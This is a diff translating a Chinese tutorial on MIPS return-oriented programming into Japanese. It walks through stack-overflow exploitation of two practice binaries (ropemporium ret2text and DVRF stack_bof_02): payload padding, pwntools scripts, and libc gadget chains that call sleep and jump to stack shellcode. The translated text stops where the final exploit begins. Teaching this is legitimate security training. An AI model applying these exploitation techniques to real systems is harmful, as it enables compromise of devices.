@@ -1,45 +1,45 @@
 # mips - ROP
-## 介绍
-本章目前只打算介绍 mips 下的 rop，其他漏洞的利用以后会逐渐介绍
-## 预备知识
-架构回顾见： https://ctf-wiki.github.io/ctf-wiki/assembly/mips/readme-zh/
-栈结构如图：
+## はじめに
+この章では現時点では mips の rop のみを紹介します。その他の脆弱性の悪用については今後順次紹介していきます。
+## 予備知識
+アーキテクチャの復習は次を参照してください: https://ctf-wiki.github.io/ctf-wiki/assembly/mips/readme-zh/
+スタック構造は図のとおりです。
 ![img](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image001.gif)
-有几个特殊的地方需要注意
+いくつか特に注意すべき点があります。
 
-1. MIPS32架构中是没有EBP寄存器的，程序函数调用的时候是将当前栈指针向下移动 n 比特到该函数的 stack frame 存储组空间，函数返回的时候再加上偏移量恢复栈
-2. 传参过程中，前四个参数$a0-$a3，多余的会保存在调用函数的预留的栈顶空间内
-3. MIPS调用函数时会把函数的返回地址直接存入$RA 寄存器
-## 简单环境适配
-我们目前以用户态的形式调试程序, 所以需要安装 且，qemu-user  等依赖
+1. MIPS32 アーキテクチャには EBP レジスタがありません。関数を呼び出すときは、現在のスタックポインタを n ビット分だけ下に動かして、その関数の stack frame の格納領域とし、関数がリターンするときにオフセットを加え戻してスタックを復元します。
+2. 引数の受け渡しでは、最初の4つの引数は $a0-$a3 で渡され、それを超える分は、呼び出し元があらかじめ確保したスタック上部の領域に保存されます。
+3. MIPS が関数を呼び出すときは、関数のリターンアドレスを直接 $RA レジスタに格納します。
+## 簡単な環境の準備
+ここではユーザーモードでプログラムをデバッグするので、qemu-user などの依存パッケージをインストールする必要があります。
 ```bash
 $ sudo apt install qemu-user
 $ sudo apt install libc6-mipsel-cross
 $ sudo mkdir /etc/qemu-binfmt
 $ sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel
 ```
-## 题目
+## 問題
 ### 1 ropemporium ret2text
-跟到 pwnme 函数里
+pwnme 関数の中を追います。
 ![image-20201028010553089](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028010554.png)
-我们可以看到函数一开始，将  ra 寄存器的值，放入 $sp+60 的位置里。即返回地址位于 $sp+60
+関数の冒頭で、ra レジスタの値が $sp+60 の位置に格納されているのが分かります。つまりリターンアドレスは $sp+60 にあります。
 ![image-20201028011257573](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028011258.png)
-在看该函数里的 read， a2 为读取的 size 大小，将被赋值为 0x38，buf 为位于 $sp + 0x18 的位置，明显的一个栈溢出漏洞，且能覆盖返回地址。
-通过计算，可以计算出 padding 为 36
+さらにこの関数内の read を見ると、a2 は読み込むサイズで 0x38 が代入され、buf は $sp + 0x18 の位置にあります。明らかにスタックオーバーフローの脆弱性があり、リターンアドレスを上書きできます。
+計算により、padding は 36 と求められます。
 
 ```
 60 - 0x18 = 36 
 ```
-另外程序有一个 ret2win 函数
+このほか、プログラムには ret2win 関数があります。
 ![image-20201028011734928](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028011736.png)
-所以该题目只需覆盖返回地址为 ret2win 函数的地址即可。所以我们可以构造如下 payload：
+そのため、この問題ではリターンアドレスを ret2win 関数のアドレスで上書きするだけでかまいません。そこで、次のような payload を構築できます。
 ```python
 pay = 'A'*36 + p32(ret2win_addr)
 ```
-即能 get flag
+これで get flag できます。
 ![image-20201028012453672](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028012455.png)
 ### 2 DVRF stack_bof_02.c
-题目源码如下
+問題のソースコードは次のとおりです。
 ```c
 #include <string.h>
 #include <stdio.h>
@@ -67,29 +67,29 @@ printf("Try Again\r\n");
 return 0;
 }
 ```
-安装交叉编译工具
+クロスコンパイルツールをインストールします。
 ```bash
 sudo apt-get update
 sudo apt-get install binutils-mipsel-linux-gnu
 sudo apt-get install gcc-mipsel-linux-gnu
 ```
-编译上面的源码
+上のソースコードをコンパイルします。
 ```bash
 mipsel-linux-gnu-gcc -fno-stack-protector stack_bof_02.c -o stack_bof_02
 ```
-程序保护
+プログラムの保護機構
 ![image-20201028025116416](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028025118.png)
-代码逻辑很简单，在 strcpy 的地方有一处栈溢出。
+コードのロジックは単純で、strcpy の箇所にスタックオーバーフローがあります。
 
-> 程序调试
+> プログラムのデバッグ
 `qemu-mipsel-static -g 1234 -L ./mipsel ./vuln_system  PAYLOAD`
--g 指定调试端口， -L 指定 lib 等文件的目录，当程序起来之后
-`gdb-multiarch stack_bof_02` 运行如下命令，然后在 gdb 里运行 `target remote 127.0.0.1:1234` 即可挂上调试器
+-g はデバッグポートを指定し、-L は lib などのファイルのディレクトリを指定します。プログラムが起動したら、
+`gdb-multiarch stack_bof_02` を実行し、gdb の中で `target remote 127.0.0.1:1234` を実行すればデバッガをアタッチできます。
 ![image-20201028032102193](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028032104.png)
-> 控制 PC
+> PC の制御
 ![image-20201028030936453](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028030938.png)
-返回地址位于 $sp+532 , buf 位于 $fp+24
-即 padding 为 `pay += b'a'*508`
+リターンアドレスは $sp+532 にあり、buf は $fp+24 にあります。
+つまり padding は `pay += b'a'*508` です。
 ```python
 # padding :532 - 24 = 508
 from pwn import *
@@ -108,16 +108,16 @@ p = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234','./stack_bof_0
 pause()
 p.interactive()
 ```
-如下图所示，即可控制 ra 寄存器，进而控制 PC
+次の図のように、ra レジスタを制御でき、ひいては PC を制御できます。
 ![image-20201028031118603](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20201028031120.png)
-> 查找使用的 gadget 完成 ret2shellcode
-由于程序没有开启 PIE 等 保护，所以我们可以直接在栈上注入 shellcode，然后控制 PC跳转到栈上
+> gadget を探して ret2shellcode を行う
+プログラムには PIE などの保護が有効になっていないため、スタック上に直接 shellcode を注入し、PC を制御してスタックへジャンプさせることができます。
 
-找 gadget 我们可以使用 mipsrop.py 这个 ida 插件进行。
+gadget を探すには、IDA プラグインの mipsrop.py を使います。
 
-由于 mips 流水指令集的特点，存在 cache incoherency 的特性，需要调用 sleep 或者其他函数将数据区刷新到当前指令区中去，才能正常执行 shellcode。为了找到更多的 gadget，以及这是一个 demo ，所有我们在 libc 里查找
-#### 1. 调用 sleep 函数
-调用 sleep 函数之前，我们需要先找到对 a0 进行设置的 gadget
+mips はパイプライン方式の命令セットで cache incoherency(キャッシュの不整合)という特性があるため、データ領域を現在の命令領域にフラッシュするために sleep などの関数を呼び出す必要があります。そうしないと shellcode を正常に実行できません。より多くの gadget を探すため、またこれは demo でもあるので、libc の中から探します。
+#### 1. sleep 関数の呼び出し
+sleep 関数を呼び出す前に、まず a0 を設定する gadget を探す必要があります。
 ```
 Python>mipsrop.find("li $a0, 1")
 ----------------------------------------------------------------------------------------------------------------
@@ -141,7 +141,7 @@ Python>mipsrop.find("li $a0, 1")
 Found 14 matching gadgets
 ```
 
-例如我们这里选择了  0x00E2660 处的 gadget
+ここでは 0x00E2660 にある gadget を選びました。
 
 ```
 .text:000E2660                 move    $t9, $s2
@@ -149,9 +149,9 @@ Found 14 matching gadgets
 .text:000E2668                 li      $a0, 1
 ```
 
-我们发现，这个 gadget 最后会跳到 s2 寄存器里的值的位置，所以，我下一步需要找到能控制 s2 的寄存器
+この gadget は最後に s2 レジスタの値が指す位置にジャンプすることが分かります。そのため、次は s2 を制御できる gadget を探す必要があります。
 
-通常而言，我们这里会使用 mipsrop 插件的 `mipsrop.tail()` 方法来寻找，从栈上设置寄存器的 gadget 
+通常はここで mipsrop プラグインの `mipsrop.tail()` メソッドを使い、スタックからレジスタを設定する gadget を探します。
 
 ```
 Python>mipsrop.tail()
@@ -181,11 +181,11 @@ Python>mipsrop.tail()
 ----------------------------------------------------------------------------------------------------------------
 Found 20 matching gadgets
 ```
-如果没有合适的，我们可以尝试找在一些 "*dir" 的函数结尾来查找，有没有合适的，例如我在 readdir64 函数的末尾发现如下 gadget
+適切なものがなければ、"*dir" 系の関数の末尾から探してみることもできます。たとえば readdir64 関数の末尾に次の gadget を見つけました。
 ![image-20201029161619764](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201029161619764.png)
 
-这样我们就能控制 s2 寄存器也能控制 PC，下一步就是跳到 sleep, 但是单纯的跳到 sleep 是不够的，同时我们要保证执行完 sleep 后能跳到下一个 gadget ，所以我们还需要一个既能 执行 sleep 又能控制下一个 PC 地址的 gadget
-看了眼寄存器，此时 我们还能控制的还挺多，例如我这里找 $a3 的寄存器
+これで s2 レジスタと PC を制御できるようになりました。次は sleep にジャンプしますが、単に sleep にジャンプするだけでは不十分です。sleep の実行後に次の gadget へ飛べるようにする必要があるため、sleep を実行でき、かつ次の PC アドレスも制御できる gadget がもう一つ必要です。
+レジスタを見ると、この時点で制御できるものがかなり多いので、ここでは $a3 のレジスタを探してみます。
 ```
 Python>mipsrop.find("mov $t9, $s3")
 ----------------------------------------------------------------------------------------------------------------
@@ -196,7 +196,7 @@ Python>mipsrop.find("mov $t9, $s3")
 |  0x000949EC  |  move $t9,$s3                                        |  jalr  $s3                             |
 ....
 ```
-通过这个 gadget 我们先跳到 s3 的寄存器执行 sleep ，再通过控制的 ra 寄存器进行下一步操作
+この gadget を使って、まず s3 レジスタの指す先にジャンプして sleep を実行し、その後、制御した ra レジスタで次の処理に進みます。
 
 
 ```
@@ -214,14 +214,14 @@ Python>mipsrop.find("mov $t9, $s3")
 .text:00094A10                 jr      $ra
 .text:00094A14                 addiu   $sp, 0x38
 ```
-通过这个 gadget 我们先跳到 s3 的寄存器执行 sleep ，再通过控制的 ra 寄存器进行下一步操作
-#### 2. jmp shellcode
+この gadget を使って、まず s3 レジスタの指す先にジャンプして sleep を実行し、その後、制御した ra レジスタで次の処理に進みます。
+#### 2. shellcode へのジャンプ
 
-下一步就是跳到 shellcode ，要跳到shellcode 我们先需要获得栈地址
+次は shellcode にジャンプします。shellcode にジャンプするには、まずスタックアドレスを取得する必要があります。
 
-我们先用 `Python>mipsrop.stackfinder()`
+まず `Python>mipsrop.stackfinder()` を使います。
 
-获得 如下 gadget
+すると次の gadget が得られます。
 
   ```asm
   .text:00095B74                 addiu   $a1, $sp, 52
@@ -231,7 +231,7 @@ Python>mipsrop.find("mov $t9, $s3")
   .text:00095B84                 move    $t9, $s5
   .text:00095B88                 jalr    $t9
   ```
-该 gadget 可以将栈地址， 即 $sp+24 的值赋值给 $a0 ，那么这个栈就是我们即将填充 shellcode 的地方， $s5 可控，最后这段 gadget 会跳往 $s5 , 那么我们只需要再找一个直接 jr $a0 的gadget 即可
+この gadget は、スタックアドレス、つまり $sp+24 の値を $a0 に代入できます。このスタックが、これから shellcode を埋め込む場所になります。$s5 は制御可能で、この gadget は最後に $s5 にジャンプするので、あとは $a0 に直接 jr する gadget をもう一つ見つければよいことになります。
 ```
   Python>mipsrop.find("move $t9, $a1")
   ----------------------------------------------------------------------------------------------------------------
@@ -251,14 +251,14 @@ Python>mipsrop.find("mov $t9, $s3")
   ----------------------------------------------------------------------------------------------------------------
   Found 11 matching gadgets
 ```
-这里使用的是 
+ここで使うのは次の gadget です。
 ```
   .text:0012568C                 move    $t9, $a1
   .text:00125690                 move    $a3, $v0
   .text:00125694                 move    $a1, $a0
   .text:00125698                 jalr    $t9
 ```
-最后的 exploit
+最後の exploit
 
 ```python
 from pwn import *
